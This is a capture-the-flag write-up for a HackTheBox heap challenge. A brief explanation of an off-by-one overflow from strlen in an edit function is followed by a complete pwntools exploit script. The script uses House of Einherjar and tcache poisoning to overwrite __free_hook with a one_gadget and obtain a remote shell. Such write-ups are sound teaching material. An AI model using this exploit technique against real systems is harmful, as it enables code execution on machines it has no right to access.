
was a classic heap challenge from hackthebox Cyber Apocalypse 2025


![vulnstrlen](https://github.com/user-attachments/assets/b3015ac9-ee9a-4ce0-81b1-296e93d38655)

vuln is one byte overfloww in edit_plan function because...

       The  strlen() function calculates the length of the string pointed to by
       s, excluding the terminating null byte ('\0').

..it will count the newline x)

so if you create a chunk and fill it and use edit_plan you can one byte overflow to the next chunk's metadata

and maybe set the prev_inuse bit to false

.....sounds familiar?


```python3
#!/usr/bin/env python3

from pwn import *
import time
'''
p = gdb.debug("./strategist_patched", gdbscript="""
    c
    """)
'''
#p = process("./strategist_patched")


p = remote("94.237.60.18", 33440)

def m(size, data):
    time.sleep(0.3)
    p.sendline(b"1")
    time.sleep(0.3)
    p.sendline(size.encode('utf-8'))
    time.sleep(0.5)
    p.sendline(data)
    
def f(idx):
    time.sleep(0.3)
    p.sendline(b"4")
    time.sleep(0.3)
    p.sendline(idx.encode('utf-8'))

def r(idx):
    time.sleep(0.3)
    p.sendline(b"2")
    time.sleep(0.3)
    p.sendline(idx.encode('utf-8'))
    p.recvuntil("Plan [{}]: \n".format(idx).encode('utf-8'))
    return p.recvline().strip()

def e(idx, data):
    time.sleep(0.3)
    p.sendline(b"3")
    time.sleep(0.3)
    p.sendline(idx.encode('utf-8'))
    p.sendafter(b"> ", data)

print("leaking the address of chunk0...")
# leak the address of chunk0
m("20", b"")
m("20", b"")
f("0")
f("1")
m("20", b"") # idx 0
m("20", b"") # idx 1

# offset = 70 # offset on local
offset = 60 # offset on remote
leak = int(str(hex(int.from_bytes(r("0"), 'little'))) + str(offset), 16)
print(hex(leak))

print(f"chunk0: {hex(leak)}")
fake_chunk = leak + 0x40 
print(f"fake chunk at {hex(fake_chunk)}")

### HOUSE OF EINHERJAR
# create a fake chunk 
m("56", p64(0x00) + p64(0x60) + p64(fake_chunk) + p64(fake_chunk)) # idx 2

# create a chunk for later use to overwrite the next chunk's prev_inuse bit
# need to fill it so strlen will read until null byte, 39 x A and a newline
m("40", b"A"*39) # idx 3

time.sleep(0.1)

# create a big chunk and overwrite its lsb byte 
m("248", b"bbbb") # idx 4
e("3", b"A"*32 + p64(0x60) + b'\x00') 

print("filling tcache...")
# fill tcache
for i in range(7):
    time.sleep(0.2)
    m("248", b"AAAA")

for i in range(7):
    time.sleep(0.2)
    f(f"{i+5}")

# now its going to consolidate with our fake chunk
f("4")

# now we can call malloc and it will begin in our fake chunk
# also some stuff to not fuck up the chunks

m("344", b"a"*32 + b"a"*8 + p64(0x31) + b"a"*20)

# padding before tcache hijacking
m("40", b"freeme") # idx 4
f("5")
f("3")

# can't use edit to overwrite it until the next pointer
# so just free it and later malloc again with the payload
f("4")

print("leaking libc...")
# get an allocation on unsortedbin
for i in range(8):
    time.sleep(0.3)
    m("528", b"AAAA")
m("20", b"XXX") 
for i in range(8):
    time.sleep(0.3)
    f(f"{i+3}")

# let it slice from unsortedbin to get a libc leak
m("512", b"") # idx 3

leak = int(str(hex(int.from_bytes(r("3"), 'little'))) + str(10), 16)
print(f"main arena: {hex(leak)}")
libc_base = leak - 0x3ebe10 
print(f"libc base {hex(libc_base)}")

binsh = libc_base + 0x1b3e1a
system = libc_base + 0x4f550
malloc_hook = libc_base + 0x3ebc30 
free_hook = libc_base + 0x3ed8e8

# one_gadgets
one1 = libc_base + 0x4f3ce
one2 = libc_base + 0x4f3d5
one3 = libc_base + 0x4f432
one4 = libc_base + 0x10a41c

print(f"free_hook {hex(free_hook)}")
print(f"malloc_hook {hex(malloc_hook)}")
print(f"binsh {hex(binsh)}")
print(f"system {hex(system)}")

print("performing tcache poisoning...")
# malloc again with the payload
m("344", b"b"*32 + b"a"*8 + p64(0x31) + p64(free_hook))
m("40", b"")
m("40", p64(one3))

# trigger the hook and enjoy your shell :p
f("3")

p.clean()

p.interactive()
```

![hacktheboxflag](https://github.com/user-attachments/assets/cc4accd1-f0f0-4188-8f69-4935b23ec9d5)

**_4rsp is still exploiting the heap...._**

